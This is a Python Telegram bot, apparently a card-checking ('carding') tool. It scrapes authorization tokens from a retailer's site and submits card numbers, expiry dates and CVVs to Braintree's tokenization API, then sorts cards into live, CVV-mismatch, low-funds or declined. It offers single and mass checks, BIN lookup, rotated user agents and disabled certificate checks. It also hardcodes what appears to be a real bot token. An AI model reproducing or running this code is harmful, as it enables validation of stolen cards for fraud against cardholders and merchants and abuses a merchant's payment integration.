import telebot
from telebot import types
import requests
import re
import uuid
import time
from datetime import datetime
import urllib3
import random
import json
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIGURATION ====================
BOT_TOKEN = '8388599467:AAHpsWxvSma5U_QFMqOa-qilroPGO9m5hKk'
ADMIN_ID = 5629984144  # Your Telegram ID
USERS_FILE = 'users.json'

# Braintree Sites List
BRAINTREE_SITES = [
    "https://www.coca-colastore.com",
    # Add more Braintree sites here
]

COOLDOWN_CHECK = 10
COOLDOWN_MASS = 20
MAX_MASS_CARDS = 10

# ==================== GLOBAL VARIABLES ====================
bot = telebot.TeleBot(BOT_TOKEN)
approved_users = set()
pending_requests = {}
user_cooldowns = {}
stop_checking = {}

# ==================== USER MANAGEMENT ====================
def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get('approved_users', [])), data.get('pending_requests', {})
        except:
            return set(), {}
    return set(), {}

def save_users():
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump({
                'approved_users': list(approved_users), 
                'pending_requests': pending_requests
            }, f, indent=4)
    except Exception as e:
        print(f"Error saving users: {e}")

def is_approved(user_id):
    return user_id == ADMIN_ID or user_id in approved_users

def require_approval(func):
    def wrapper(message):
        if not is_approved(message.from_user.id):
            text = "╔════════════════════════════╗\n"
            text += "║     🚫 ACCESS DENIED 🚫     ║\n"
            text += "╚════════════════════════════╝\n\n"
            text += "⚠️ <b>You need admin approval</b>\n"
            text += "📝 Use /request to get access\n"
            bot.send_message(message.chat.id, text, parse_mode='HTML')
            return
        return func(message)
    return wrapper

# ==================== UTILITY FUNCTIONS ====================
def generate_user_agent():
    return random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ])

def check_cooldown(chat_id, command_type):
    current_time = time.time()
    cooldown = COOLDOWN_CHECK if command_type == 'check' else COOLDOWN_MASS
    
    if chat_id not in user_cooldowns: 
        user_cooldowns[chat_id] = {}
    
    if command_type in user_cooldowns[chat_id]:
        time_passed = current_time - user_cooldowns[chat_id][command_type]
        if time_passed < cooldown:
            return False, int(cooldown - time_passed) + 1
    
    user_cooldowns[chat_id][command_type] = current_time
    return True, 0

def get_card_info(card_number):
    info = {
        'brand': 'Unknown', 
        'type': 'Unknown', 
        'country': 'Unknown', 
        'flag': '🌍', 
        'bank': 'Unknown', 
        'level': 'Unknown'
    }
    bin_number = card_number[:6]
    
    try:
        response = requests.get(
            f"https://lookup.binlist.net/{bin_number}",
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}, 
            timeout=10, 
            verify=False
        )
        if response.status_code == 200:
            data = response.json()
            if data.get('scheme'): 
                info['brand'] = data['scheme'].upper()
            if data.get('type'): 
                info['type'] = data['type'].title()
            if data.get('brand'): 
                info['level'] = data['brand'].title()
            if data.get('bank', {}).get('name'): 
                info['bank'] = data['bank']['name'].title()
            if data.get('country', {}).get('name'): 
                info['country'] = data['country']['name'].upper()
            if data.get('country', {}).get('alpha2') and len(data['country']['alpha2']) == 2:
                info['flag'] = ''.join(chr(127397 + ord(c)) for c in data['country']['alpha2'].upper())
    except:
        pass
    
    if card_number[0] == '4': 
        info['brand'], info['type'] = 'VISA', 'Credit'
    elif card_number[:2] in ['51', '52', '53', '54', '55']: 
        info['brand'], info['type'] = 'MASTERCARD', 'Credit'
    elif card_number[:2] in ['34', '37']: 
        info['brand'], info['type'] = 'AMEX', 'Credit'
    
    return info

def luhn_check(card_number):
    digits = [int(d) for d in str(card_number)]
    checksum = sum(digits[-1::-2]) + sum(sum([int(d) for d in str(d * 2)]) for d in digits[-2::-2])
    return checksum % 10 == 0

# ==================== BRAINTREE CHECKER ====================
class BraintreeChecker:
    def __init__(self, site_url):
        self.site_url = site_url
        self.session = requests.Session()
        self.headers = {
            'User-Agent': generate_user_agent(),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
        }
        
    def get_bearer_token(self):
        """Extract Bearer token from site"""
        try:
            # Try common Braintree endpoints
            endpoints = [
                '/rest/sac/V1/guest-carts/WHHwLZpe4nWXTEpxcQbgxQBqunRXQV2/payment-information',
                '/checkout',
                '/cart',
            ]
            
            for endpoint in endpoints:
                try:
                    response = self.session.get(
                        f"{self.site_url}{endpoint}",
                        headers=self.headers,
                        timeout=30,
                        verify=False
                    )
                    
                    # Search for Bearer token in response
                    bearer_match = re.search(r'Bearer\s+([A-Za-z0-9\-_\.]+)', response.text)
                    if bearer_match:
                        return bearer_match.group(1)
                    
                    # Search for authorization token
                    auth_match = re.search(r'"authorization["\']?\s*:\s*["\']([^"\']+)', response.text)
                    if auth_match:
                        return auth_match.group(1)
                        
                except:
                    continue
            
            # Fallback: Try to get from main page
            response = self.session.get(self.site_url, headers=self.headers, timeout=30, verify=False)
            
            # Look for Braintree client token
            token_match = re.search(r'client_token["\']?\s*[:=]\s*["\']([^"\']+)', response.text)
            if token_match:
                return token_match.group(1)
                
            return None
        except Exception as e:
            print(f"Error getting token: {e}")
            return None
    
    def validate_card(self, card):
        try:
            parts = card.replace(' ', '').split('|')
            if len(parts) != 4:
                return {'status': 'error', 'message': 'Invalid format', 'icon': '❌'}
            
            number, exp_month, exp_year, cvv = parts
            
            if not number.isdigit() or len(number) < 13 or len(number) > 19:
                return {'status': 'error', 'message': 'Invalid card number', 'icon': '❌'}
            
            card_info = get_card_info(number)
            
            if not luhn_check(number):
                return {'status': 'error', 'message': 'Invalid card (Luhn failed)', 'icon': '❌', 'card_info': card_info}
            
            if len(exp_year) == 4:
                exp_year = exp_year[-2:]
        except Exception as e:
            return {'status': 'error', 'message': f'Parse error: {str(e)}', 'icon': '❌'}
        
        # Get Bearer token
        bearer_token = self.get_bearer_token()
        if not bearer_token:
            return {'status': 'error', 'message': 'Failed to get authorization token', 'icon': '❌', 'card_info': card_info}
        
        # Prepare GraphQL mutation for Braintree
        graphql_query = {
            "query": """
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                    tokenizeCreditCard(input: $input) {
                        paymentMethod {
                            id
                            details {
                                ... on CreditCardDetails {
                                    cardholderName
                                }
                            }
                        }
                    }
                }
            """,
            "variables": {
                "input": {
                    "creditCard": {
                        "number": number,
                        "expirationMonth": exp_month,
                        "expirationYear": f"20{exp_year}",
                        "cvv": cvv
                    }
                }
            }
        }
        
        try:
            # Send request to Braintree GraphQL API
            braintree_headers = {
                'Authorization': f'Bearer {bearer_token}',
                'Content-Type': 'application/json',
                'Accept': '*/*',
                'User-Agent': generate_user_agent(),
                'Origin': self.site_url,
                'Referer': f'{self.site_url}/',
            }
            
            response = self.session.post(
                'https://payments.braintree-api.com/graphql',
                json=graphql_query,
                headers=braintree_headers,
                timeout=30,
                verify=False
            )
            
            response_data = response.json()
            response_text = json.dumps(response_data).lower()
            
            # Check for success
            if 'tokenizecreditcard' in response_text and 'paymentmethod' in response_text:
                if response_data.get('data', {}).get('tokenizeCreditCard', {}).get('paymentMethod'):
                    return {'status': 'live', 'message': 'Card Live ✨', 'icon': '✅', 'card_info': card_info}
            
            # Check errors
            errors = response_data.get('errors', [])
            if errors:
                error_message = errors[0].get('message', 'Unknown error').lower()
                
                # CVV/CVC errors
                if any(x in error_message for x in ['cvv', 'cvc', 'security code', 'verification']):
                    return {'status': 'live_cvc', 'message': 'CCN Matched (Invalid CVV)', 'icon': '⚠️', 'card_info': card_info}
                
                # Insufficient funds
                if any(x in error_message for x in ['insufficient', 'funds', 'balance']):
                    return {'status': 'insufficient', 'message': 'Insufficient Funds', 'icon': '💰', 'card_info': card_info}
                
                # Declined
                if any(x in error_message for x in ['declined', 'rejected', 'invalid', 'not authorized']):
                    return {'status': 'dead', 'message': 'Card Declined', 'icon': '❌', 'card_info': card_info}
                
                return {'status': 'dead', 'message': error_message.capitalize(), 'icon': '❌', 'card_info': card_info}
            
            return {'status': 'error', 'message': 'Unknown response', 'icon': '❌', 'card_info': card_info}
            
        except Exception as e:
            return {'status': 'error', 'message': f'Error: {str(e)}', 'icon': '❌', 'card_info': card_info}

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    if not is_approved(user_id):
        text = "╔═══════════════════════════════╗\n"
        text += "║  💎 <b>BRAINTREE CHECKER</b> 💎  ║\n"
        text += "╚═══════════════════════════════╝\n\n"
        text += "⚠️ <b>ACCESS REQUIRED</b> ⚠️\n\n"
        text += "🔒 You need admin approval\n"
        text += "📝 Use /request for access\n\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    else:
        text = "╔═══════════════════════════════╗\n"
        text += "║  💎 <b>BRAINTREE CHECKER</b> 💎  ║\n"
        text += "╚═══════════════════════════════╝\n\n"
        text += "🎯 <b>MAIN COMMANDS</b>\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        text += "💳 /check - <i>Single card check</i>\n"
        text += "📦 /mass - <i>Multiple cards</i>\n"
        text += "🔍 /bin - <i>BIN lookup</i>\n"
        text += "❓ /help - <i>Show help</i>\n\n"
        
        if user_id == ADMIN_ID:
            text += "👑 <b>ADMIN COMMANDS</b>\n"
            text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            text += "👥 /users - <i>List users</i>\n"
            text += "⏳ /pending - <i>Pending requests</i>\n\n"
        
        text += "✨ <b>Powered by Yosh</b> ✨"
    
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['help'])
@require_approval
def show_help(message):
    text = "╔═══════════════════════════════╗\n"
    text += "║     📖 <b>HELP & USAGE</b> 📖     ║\n"
    text += "╚═══════════════════════════════╝\n\n"
    text += "💳 <b>CARD FORMAT</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += "<code>CARD|MM|YY|CVV</code>\n\n"
    text += "<b>Example:</b>\n<code>4532123456789012|12|25|123</code>\n\n"
    text += "🎯 <b>COMMANDS</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += "• /check CARD - Check single card\n"
    text += "• /mass CARD1 CARD2 - Check multiple\n"
    text += "• /bin XXXXXX - BIN lookup\n\n"
    text += "⏱️ <b>COOLDOWNS</b>\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"• /check: {COOLDOWN_CHECK}s\n"
    text += f"• /mass: {COOLDOWN_MASS}s\n"
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['check'])
@require_approval
def check_card(message):
    chat_id = message.chat.id
    
    can_proceed, wait_time = check_cooldown(chat_id, 'check')
    if not can_proceed:
        text = f"⏳ <b>Cooldown Active</b>\n\nWait <b>{wait_time}</b> seconds"
        bot.send_message(chat_id, text, parse_mode='HTML')
        return
    
    try:
        card = message.text.split(None, 1)[1].strip()
    except:
        text = "❌ <b>Invalid Usage</b>\n\n<b>Format:</b>\n<code>/check CARD|MM|YY|CVV</code>"
        bot.send_message(chat_id, text, parse_mode='HTML')
        return
    
    status_msg = bot.send_message(chat_id, "⏳ <b>Checking your card...</b>\n\n🔄 Processing via Braintree...", parse_mode='HTML')
    
    # Select random site
    site = random.choice(BRAINTREE_SITES)
    checker = BraintreeChecker(site)
    result = checker.validate_card(card)
    
    info = result.get('card_info', {})
    
    text = f"╔═══════════════════════════════╗\n"
    text += f"║  {result['icon']} <b>{result['message']}</b>  ║\n"
    text += f"╚═══════════════════════════════╝\n\n"
    text += f"💳 <b>Card:</b> <code>{card}</code>\n\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"<b>📊 CARD INFO</b>\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    text += f"🏦 <b>Bank:</b> {info.get('bank', 'Unknown')}\n"
    text += f"🌍 <b>Country:</b> {info.get('flag', '🌍')} {info.get('country', 'Unknown')}\n"
    text += f"💎 <b>Brand:</b> {info.get('brand', 'Unknown')}\n"
    text += f"🔖 <b>Type:</b> {info.get('type', 'Unknown')}\n"
    text += f"⭐ <b>Level:</b> {info.get('level', 'Unknown')}\n\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🌐 <b>Gateway:</b> Braintree\n"
    text += f"⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
    text += f"👤 <b>By:</b> {message.from_user.first_name}"
    
    bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['mass'])
@require_approval
def mass_check(message):
    chat_id = message.chat.id
    
    can_proceed, wait_time = check_cooldown(chat_id, 'mass')
    if not can_proceed:
        text = f"⏳ <b>Cooldown Active</b>\n\nWait <b>{wait_time}</b> seconds"
        bot.send_message(chat_id, text, parse_mode='HTML')
        return
    
    try:
        cards = message.text.split()[1:]
        if not cards or len(cards) > MAX_MASS_CARDS:
            raise ValueError
    except:
        text = f"❌ <b>Invalid Usage</b>\n\n<b>Format:</b> <code>/mass CARD1 CARD2...</code>\n<b>Max:</b> {MAX_MASS_CARDS} cards"
        bot.send_message(chat_id, text, parse_mode='HTML')
        return
    
    stop_checking[chat_id] = False
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{chat_id}"))
    
    status_msg = bot.send_message(chat_id, f"⏳ <b>Checking {len(cards)} cards...</b>", reply_markup=markup, parse_mode='HTML')
    
    site = random.choice(BRAINTREE_SITES)
    checker = BraintreeChecker(site)
    results = {'live': 0, 'ccn': 0, 'low_funds': 0, 'declined': 0}
    
    for i, card in enumerate(cards):
        if stop_checking.get(chat_id, False):
            break
        
        result = checker.validate_card(card)
        
        if result['status'] == 'live':
            results['live'] += 1
        elif result['status'] == 'live_cvc':
            results['ccn'] += 1
        elif result['status'] == 'insufficient':
            results['low_funds'] += 1
        else:
            results['declined'] += 1
        
        if result['status'] in ['live', 'live_cvc', 'insufficient']:
            info = result.get('card_info', {})
            text = f"╔═══════════════════════════════╗\n"
            text += f"║  {result['icon']} <b>{result['message']}</b>  ║\n"
            text += f"╚═══════════════════════════════╝\n\n"
            text += f"💳 <code>{card}</code>\n\n"
            text += f"💎 {info.get('brand')} | {info.get('flag')} {info.get('country')}"
            bot.send_message(chat_id, text, parse_mode='HTML')
    
    summary = f"╔═══════════════════════════════╗\n"
    summary += f"║   ✅ <b>CHECK COMPLETE</b> ✅   ║\n"
    summary += f"╚═══════════════════════════════╝\n\n"
    summary += f"📊 <b>RESULTS</b>\n"
    summary += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    summary += f"✅ <b>Live:</b> {results['live']}\n"
    summary += f"⚠️ <b>CCN:</b> {results['ccn']}\n"
    summary += f"💰 <b>Low Funds:</b> {results['low_funds']}\n"
    summary += f"❌ <b>Declined:</b> {results['declined']}\n\n"
    summary += f"📦 <b>Total:</b> {len(cards)} cards"
    
    bot.edit_message_text(summary, chat_id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['bin'])
@require_approval
def bin_lookup(message):
    try:
        bin_number = message.text.split()[1][:6]
        if not bin_number.isdigit() or len(bin_number) < 6:
            raise ValueError
    except:
        bot.send_message(message.chat.id, "❌ <b>Usage:</b> <code>/bin XXXXXX</code>", parse_mode='HTML')
        return
    
    info = get_card_info(bin_number + "0000000000")
    text = "╔═══════════════════════════════╗\n"
    text += "║      🔍 <b>BIN LOOKUP</b> 🔍      ║\n"
    text += "╚═══════════════════════════════╝\n\n"
    text += f"🔢 <b>BIN:</b> <code>{bin_number}</code>\n\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    text += f"<b>📊 DETAILS</b>\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    text += f"🏦 <b>Bank:</b> {info['bank']}\n"
    text += f"🌍 <b>Country:</b> {info['flag']} {info['country']}\n"
    text += f"💎 <b>Brand:</b> {info['brand']}\n"
    text += f"📌 <b>Type:</b> {info['type']}\n"
    text += f"⭐ <b>Level:</b> {info['level']}"
    bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['request'])
def request_access(message):
    user_id = message.from_user.id
    
    if is_approved(user_id):
        bot.send_message(message.chat.id, "✅ <b>You already have access!</b>", parse_mode='HTML')
        return
    
    if user_id in pending_requests:
        bot.send_message(message.chat.id, "⏳ <b>Request pending...</b>", parse_mode='HTML')
        return
    
    username = message.from_user.username or "No username"
    full_name = f"{message.from_user.first_name or 'Unknown'} {message.from_user.last_name or ''}".strip()
    
    pending_requests[user_id] = {
        'username': username, 
        'name': full_name, 
        'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    save_users()
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
        types.InlineKeyboardButton("❌ Deny", callback_data=f"deny_{user_id}")
    )
    
    bot.send_message(ADMIN_ID, f"📥 <b>New Request</b>\n\n👤 {full_name}\n🔗 @{username}\n🆔 <code>{user_id}</code>", reply_markup=markup, parse_mode='HTML')
    bot.send_message(message.chat.id, "✅ <b>Request sent to admin!</b>", parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith(('approve_', 'deny_', 'stop_check_')))
def handle_callbacks(call):
    if call.data.startswith('stop_check_'):
        chat_id = int(call.data.split('_')[2])
        if call.from_user.id == chat_id or call.from_user.id == ADMIN_ID:
            stop_checking[chat_id] = True
            bot.answer_callback_query(call.id, "🛑 Stopping...")
    elif call.from_user.id == ADMIN_ID:
        action, user_id = call.data.split('_')
        user_id = int(user_id)
        
        if action == 'approve':
            approved_users.add(user_id)
            pending_requests.pop(user_id, None)
            save_users()
            bot.edit_message_text(f"✅ User {user_id} approved!", call.message.chat.id, call.message.message_id, parse_mode='HTML')
            try:
                bot.send_message(user_id, "🎉 <b>Access Granted!</b>\n\nType /start to begin", parse_mode='HTML')
            except:
                pass
        elif action == 'deny':
            pending_requests.pop(user_id, None)
            save_users()
            bot.edit_message_text(f"❌ User {user_id} denied!", call.message.chat.id, call.message.message_id, parse_mode='HTML')

# ==================== START BOT ====================
if __name__ == '__main__':
    print("=" * 60)
    print("🤖 BRAINTREE CARD CHECKER BOT")
    print("=" * 60)
    
    approved_users, pending_requests = load_users()
    
    print(f"✅ Bot started successfully!")
    print(f"🌐 Gateway: Braintree GraphQL")
    print(f"📊 Approved users: {len(approved_users)}")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print("=" * 60)
    print("🔄 Bot is running...")
    print("=" * 60)
    
    bot.infinity_polling()